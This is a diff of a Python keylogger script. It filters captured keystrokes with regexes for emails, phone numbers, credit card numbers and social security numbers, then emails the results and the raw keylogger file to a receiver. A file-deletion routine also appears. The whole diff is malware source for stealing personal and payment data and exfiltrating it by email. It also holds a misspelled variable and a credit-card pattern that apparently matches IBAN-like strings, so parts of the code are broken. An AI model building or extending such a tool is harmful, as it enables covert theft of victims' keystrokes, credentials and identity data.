@@ -36,28 +36,25 @@ def extract_valuable_info(keysniffer_data, filtered_data):
     patterns = {
         # Accept emails ending with @gmail.com or @hotmail.com
         "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
-        # Phone numbers: Accepts European numbers with optional international prefix (+ or 00), no letters or symbols
-        "phone_numbers": r"\+?3[0-9]|4[0-9]|5[0-9]|6[0-9]|7[0-9]|00[1-9]\d{1,14}",
+        # Phone numbers: At least 9 digits, optional spaces, no letters or symbols
+        "phone_numbers": r"\+?(\d{1,3}[- ]?)?(\d{9,})",  # 9 or more digits, with optional international prefix and spaces
+        # Example: +49 123456789, 0033-123456789
         # URLs: added support for subdomains and optional trailing slash
         "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
-        # Credit cards: accept with or without spaces/dashes
-        "credit_cards": r"\b(?:\d{4}[- ]?){3}\d{4}\b",
+        # Example: https://example.com, http://sub.example.co.uk/path
+        # Credit cards: Only accept those starting with LU and exactly 18 digits
+        "credit_cards": r"\bLU\d{18}\b",  # Starts with 'LU' and followed by exactly 18 digits
+        # Example: LU123456789012345678, LU987654321012345678
         # IP addresses: IPv4 pattern
         "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
+        # Example: 192.168.1.1, 8.8.8.8
         # Dates: Accepts both separated (slashes, dots, dashes) and non-separated, European format DD-MM-YYYY or DDMMYYYY
         "dates": r"\b(?:\d{2}[-/.]?\d{2}[-/.]?\d{4})\b",
+        # Example: 03-01-2025, 03012025
         # Social Security Numbers: Accepts exactly 13 digits with no separation
         "social_security_numbers": r"\b\d{13}\b",
+        # Example: 1234567890123
     }
-
-    # Examples for each pattern
-    # emails: Example: johndoe@gmail.com, user@hotmail.com (only gmail.com or hotmail.com allowed)
-    # phone_numbers: Example: +49-123456789, 0033-123456789 (European numbers with international prefixes)
-    # urls: Example: https://example.com, http://sub.example.co.uk/path
-    # credit_cards: Example: 1234-5678-1234-5678, 1234567812345678
-    # ip_addresses: Example: 192.168.1.1, 8.8.8.8
-    # dates: Example: 03-01-2025, 03012025
-    # social_security_numbers: Example: 1234567890123
 
     extracted_data = {}
 
@@ -110,15 +107,13 @@ def send_email():
     message = MIMEMultipart()
     message["From"] = sender_email
     message["To"] = receiver_email
-    message["Subject"] = "File Attachment: valuable Info"
+    message["Subject"] = "File Attachments: valuable_info.txt and keysniffer_data.txt"
 
     # Email body
-    email_body = (
-        """<html><body><p>Please find the attached files here: .</p></body></html>"""
-    )
+    email_body = """<html><body><p>Please find the attached files containing filtered data and keylogger data.</p></body></html>"""
     message.attach(MIMEText(email_body, "html"))
 
-    # Attach the filtered data file
+    # Attach the filtered data file (valuable_info.txt)
     with open(filtered_data_file, "rb") as file:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(file.read())
@@ -129,16 +124,16 @@ def send_email():
         )
         message.attach(part)
 
-    # Attach the second file
-    with open(second_data_file, "rb") as file:
-        part2 = MIMEBase("application", "octet-stream")
-        part2.set_payload(file.read())
-        encoders.encode_base64(part2)
-        part2.add_header(
+    # Attach the keylogger data file (keysniffer_data.txt)
+    with open("keysniffer_data.txt", "rb") as file:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(file.read())
+        encoders.encode_base64(part)
+        part.add_header(
             "Content-Disposition",
-            f"attachment; filename={second_data_file}",
+            f"attachment; filename=keysniffer_data.txt",
         )
-        message.attach(part2)
+        message.attach(part)
 
     # Send the email
     try:
@@ -181,16 +176,21 @@ def delete_all_files():
 # ===================================================== File Existence Handling =====================================================
 
 
-def check_and_create_file(file_path, retries=3, delay=2):
-    """Check if the file exists, and create it if not, retrying a few times if it fails."""
+def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
+    """Check if the files exist, and create them if not, retrying a few times if they fail."""
     for attempt in range(retries):
-        if os.path.exists(file_path):
+        # Check if both files exist
+        if os.path.exists(valuable_info) and os.path.exists(keysneffer_data):
             return True
         else:
-            print(f"File not found: {file_path}. Retrying {attempt + 1}/{retries}...")
+            print(
+                f"Files not found: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
+            )
             time.sleep(delay)
             if attempt == retries - 1:
-                print(f"Failed to find or create file: {file_path}")
+                print(
+                    f"Failed to find or create files: {valuable_info}, {keysniffer_data}"
+                )
                 return False
     return False
 
